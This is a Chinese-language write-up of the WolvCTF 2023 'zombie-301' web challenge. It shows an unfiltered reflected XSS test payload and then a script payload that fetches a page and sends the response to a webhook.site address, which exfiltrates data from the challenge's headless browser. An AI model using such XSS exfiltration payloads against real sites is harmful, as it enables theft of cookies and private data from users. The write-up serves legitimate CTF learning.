# WolvCTF(2023)-zombie-301 writeup

访问题目地址:

![web-3.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.1.png)

有两个输入框，先看下前端代码,只有两个接口信息：
![web-3.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.2.png)

貌似没啥东西，第一个输入框要求输入一个zombie节目，第二个是输入一个zombie节目url。

第一个框随便输入内容之后，回显内容如下，输入内容嵌入到页面里面了

![web-3.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.3.png)

试试xss注入,很好，没有过滤：

<script>alert(1)</script>

请求地址：`http://49.232.142.230:11589/zombie?show=%3Cscript%3Ealert%281%29%3C%2Fscript%3E`

![web-3.8](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.8.png)

第二个框是输入一个url,随便输入之后，回显内容要求输入的url中host头要和题目地址一样，emm

![web-3.9](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-3.9.png)

试下201中的debug接口：

![web-5.1](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-5.1.png)

debug接口有鉴权，访问不成功了，emm,现在可以知道的是，请求头中的cookie信息中含有flag信息，原本想试试访问请求头或者响应头信息 的，但是没有cors可以利用，**普通用户的浏览器**在默认安全策略下是**无法通过 `fetch` 获取跨域响应的内容（包括响应体、响应头等）**的，除非目标服务器主动设置了允许跨域访问的 CORS 头。如果是普通用户浏览器，JS 是拿不到跨域响应内容的；但在题目环境中，往往没开这个限制，甚至可以读取 `file://`。直接读取response信息：

```
<script>fetch("http://49.232.142.230:12327/").then((data) => fetch("https://webhook.site/409eebb6-3c36-4da2-915b-1d2c3ea3426c?c=".concat(JSON.stringify(data))));</script>
```

在 CTF 中通过 `` + `fetch()` 成功读取并 exfiltrate 敏感 response 内容，是因为代码在服务端无头浏览器中运行，**绕过了浏览器原本的 CORS 限制。**

![web-5.2](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-5.2.png)

webhook回传 Node.js中读取 HTTP 响应内容时未做 `stream` 转换处理直接返回了原始 `ReadableStream` 对象

![web-5.3](https://github.com/rootwlen/ctf/blob/main/web%20/img/web-5.3.png)
